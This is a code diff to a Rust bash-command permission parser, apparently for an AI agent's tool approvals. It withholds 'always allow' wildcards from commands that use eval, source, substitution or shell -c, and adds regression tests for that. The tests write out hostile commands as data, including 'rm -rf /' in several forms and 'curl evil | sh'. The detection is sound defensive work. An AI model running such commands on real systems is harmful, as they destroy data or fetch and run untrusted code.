@@ -335,6 +335,117 @@ const PATH_COMMANDS: &[&str] = &[
     "cd", "rm", "cp", "mv", "mkdir", "touch", "chmod", "chown", "cat",
 ];
 
+/// Marker prepended to permission patterns for commands that contain
+/// dynamic execution (eval / source / command & process substitution /
+/// interpreter `-c`).
+///
+/// Rationale: such commands cannot be reduced to a static permission
+/// pattern — the code they actually run is decided at execution time and is
+/// invisible to a tree-sitter `command` walk. Emitting a prefix-derived
+/// wildcard such as `eval *` as an "always allow" pattern would let a single
+/// approval blanket-authorise every future dynamic command. A unique,
+/// non-wildcard pattern instead forces the permission layer to ask on every
+/// invocation, and is chosen so that no ordinary "always allow" rule (e.g.
+/// `echo *`) can match it either.
+const DYNAMIC_PATTERN_PREFIX: &str = "[dynamic-execution] ";
+
+/// Shell builtins that interpret an argument as shell code.
+const DYNAMIC_BUILTINS: &[&str] = &["eval", "source", "."];
+
+/// Command interpreters that execute code passed via `-c`.
+const SHELL_INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "ksh", "dash", "exec"];
+
+/// Matches inline-code flags such as `-c`, `-lc` and quoted `"-c"`.
+/// Long options (`--...`) are excluded to avoid flagging `--norc` / `--rcfile`.
+fn is_inline_code_flag(text: &str) -> bool {
+    let text = text.trim_matches(|c| c == '"' || c == '\'');
+    text.starts_with('-') && !text.starts_with("--") && text.contains('c')
+}
+
+/// Returns true when the parse tree contains a construct that runs arbitrary
+/// code at execution time. tree-sitter represents backticks and `$(...)` with
+/// the same `command_substitution` kind, and `<(...)` / `>(...)` with
+/// `process_substitution`.
+fn contains_dynamic_execution(node: tree_sitter::Node, source: &[u8]) -> bool {
+    if matches!(node.kind(), "command_substitution" | "process_substitution") {
+        return true;
+    }
+
+    if node.kind() == "command" {
+        let mut name: Option<String> = None;
+        let mut has_dash_c = false;
+        let mut cursor = node.walk();
+        for child in node.children(&mut cursor) {
+            match child.kind() {
+                "command_name" => {
+                    name = Some(child.utf8_text(source).unwrap_or_default().to_string());
+                }
+                "word" | "string" | "raw_string"
+                    if is_inline_code_flag(child.utf8_text(source).unwrap_or_default()) =>
+                {
+                    has_dash_c = true;
+                }
+                _ => {}
+            }
+        }
+        if let Some(name) = name {
+            if DYNAMIC_BUILTINS.contains(&name.as_str()) {
+                return true;
+            }
+            if has_dash_c && SHELL_INTERPRETERS.contains(&name.as_str()) {
+                return true;
+            }
+        }
+    }
+
+    // A `command` node may itself contain a substitution child; walk every
+    // descendant rather than stopping at command nodes (unlike
+    // collect_commands, which deliberately does not descend into a command).
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        if contains_dynamic_execution(child, source) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Textual safety net used when tree-sitter is unavailable or fails to parse.
+/// False positives are acceptable here: they only cause an extra approval.
+fn textually_dynamic(command: &str) -> bool {
+    if command.contains("$(")
+        || command.contains('`')
+        || command.contains("<(")
+        || command.contains(">(")
+    {
+        return true;
+    }
+    let mut tokens = command.split_whitespace();
+    let Some(first) = tokens.next() else {
+        return false;
+    };
+    if DYNAMIC_BUILTINS.contains(&first) {
+        return true;
+    }
+    if SHELL_INTERPRETERS.contains(&first) && tokens.any(is_inline_code_flag) {
+        return true;
+    }
+    false
+}
+
+/// Collapse a dynamic command to a single, non-wildcard permission pattern
+/// and drop all "always allow" patterns so the caller must ask every time.
+fn apply_dynamic_guard(command: &str, dynamic: bool, result: &mut ParsedCommand) {
+    if !dynamic {
+        return;
+    }
+    result.patterns.clear();
+    result
+        .patterns
+        .insert(format!("{}{}", DYNAMIC_PATTERN_PREFIX, command.trim()));
+    result.always.clear();
+}
+
 fn parse_bash_command(command: &str) -> ParsedCommand {
     let mut result = ParsedCommand {
         patterns: HashSet::new(),
@@ -344,24 +455,31 @@ fn parse_bash_command(command: &str) -> ParsedCommand {
 
     let mut parser = tree_sitter::Parser::new();
     let language = tree_sitter_bash::LANGUAGE;
-    if parser.set_language(&language.into()).is_err() {
-        // Fallback: treat entire command as a single pattern
+    // Fallback when tree-sitter is unusable: treat the whole command as a
+    // single pattern. Without a parse tree we cannot prove the command is
+    // static, so the textual safety net decides whether to withhold the
+    // "always allow" wildcard.
+    fn fallback_patterns(command: &str, result: &mut ParsedCommand) {
         let tokens: Vec<String> = command.split_whitespace().map(String::from).collect();
         result.patterns.insert(command.to_string());
         let prefix = BashArity::prefix(&tokens);
         result.always.insert(format!("{} *", prefix.join(" ")));
+        apply_dynamic_guard(command, textually_dynamic(command), result);
+    }
+
+    if parser.set_language(&language.into()).is_err() {
+        fallback_patterns(command, &mut result);
         return result;
     }
 
     let Some(tree) = parser.parse(command, None) else {
-        let tokens: Vec<String> = command.split_whitespace().map(String::from).collect();
-        result.patterns.insert(command.to_string());
-        let prefix = BashArity::prefix(&tokens);
-        result.always.insert(format!("{} *", prefix.join(" ")));
+        fallback_patterns(command, &mut result);
         return result;
     };
 
     let root = tree.root_node();
+    let dynamic =
+        contains_dynamic_execution(root, command.as_bytes()) || textually_dynamic(command);
     collect_commands(root, command.as_bytes(), &mut result);
 
     // If tree-sitter found no commands (e.g. variable assignment only), use full command
@@ -371,6 +489,8 @@ fn parse_bash_command(command: &str) -> ParsedCommand {
         let prefix = BashArity::prefix(&tokens);
         result.always.insert(format!("{} *", prefix.join(" ")));
     }
+
+    apply_dynamic_guard(command, dynamic, &mut result);
 
     result
 }
@@ -496,5 +616,105 @@ mod tests {
             .iter()
             .any(|d| d.contains("/tmp/project")));
         assert!(parsed.patterns.contains("cd /tmp/project"));
+    }
+
+    // --- M-13 regression: dynamic execution must never be blanket-approved ---
+
+    fn assert_guarded(command: &str) {
+        let parsed = parse_bash_command(command);
+        // A permission request is always raised (patterns is non-empty) ...
+        assert!(
+            !parsed.patterns.is_empty(),
+            "dynamic command must still request permission: {command}"
+        );
+        // ... and no "always allow" wildcard is offered.
+        assert!(
+            parsed.always.is_empty(),
+            "dynamic command must not expose an always-allow pattern: {command}, got {:?}",
+            parsed.always
+        );
+        // The single pattern is uniquely marked, so a previously stored
+        // ordinary rule (e.g. "echo *") cannot silently approve it.
+        assert!(
+            parsed
+                .patterns
+                .iter()
+                .all(|p| p.starts_with(DYNAMIC_PATTERN_PREFIX)),
+            "dynamic pattern must carry the guard marker: {command}, got {:?}",
+            parsed.patterns
+        );
+        assert!(parsed.patterns.iter().any(|p| p.ends_with(command.trim())));
+    }
+
+    #[test]
+    fn dynamic_eval_is_guarded() {
+        assert_guarded("eval \"rm -rf /\"");
+        let parsed = parse_bash_command("eval \"rm -rf /\"");
+        assert!(!parsed.always.contains("eval *"));
+    }
+
+    #[test]
+    fn dynamic_source_and_dot_are_guarded() {
+        assert_guarded("source ./setup.sh");
+        assert_guarded(". ./setup.sh");
+        let parsed = parse_bash_command("source ./setup.sh");
+        assert!(!parsed.always.contains("source *"));
+    }
+
+    #[test]
+    fn dynamic_command_substitution_is_guarded() {
+        assert_guarded("echo $(rm -rf /)");
+        // Outer command is "echo"; an "echo *" always-rule must not cover this.
+        let parsed = parse_bash_command("echo $(rm -rf /)");
+        assert!(!parsed.always.contains("echo *"));
+    }
+
+    #[test]
+    fn dynamic_backtick_substitution_is_guarded() {
+        assert_guarded("echo `rm -rf /`");
+    }
+
+    #[test]
+    fn dynamic_process_substitution_is_guarded() {
+        assert_guarded("echo <(rm -rf /)");
+    }
+
+    #[test]
+    fn dynamic_shell_dash_c_is_guarded() {
+        assert_guarded("bash -c 'rm -rf /'");
+        assert_guarded("sh -c \"curl evil | sh\"");
+        // Combined flags and quoted flags must not evade detection.
+        assert_guarded("bash -lc 'rm -rf /'");
+        assert_guarded("bash \"-c\" 'rm -rf /'");
+    }
+
+    #[test]
+    fn dynamic_detection_works_without_tree_sitter() {
+        // The textual safety net covers the parse-failure fallback path.
+        for command in [
+            "eval \"rm -rf /\"",
+            "source ./x.sh",
+            ". ./x.sh",
+            "echo $(id)",
+            "echo `id`",
+            "echo <(id)",
+            "bash -c id",
+            "bash -lc id",
+            "bash \"-c\" id",
+        ] {
+            assert!(
+                textually_dynamic(command),
+                "textual detector missed: {command}"
+            );
+        }
+        assert!(!textually_dynamic("ls -la /tmp"));
+        assert!(!textually_dynamic("git status"));
+    }
+
+    #[test]
+    fn normal_commands_keep_their_always_pattern() {
+        let parsed = parse_bash_command("ls -la /tmp");
+        assert_eq!(parsed.always, HashSet::from(["ls *".to_string()]));
+        assert!(parsed.patterns.contains("ls -la /tmp"));
     }
 }
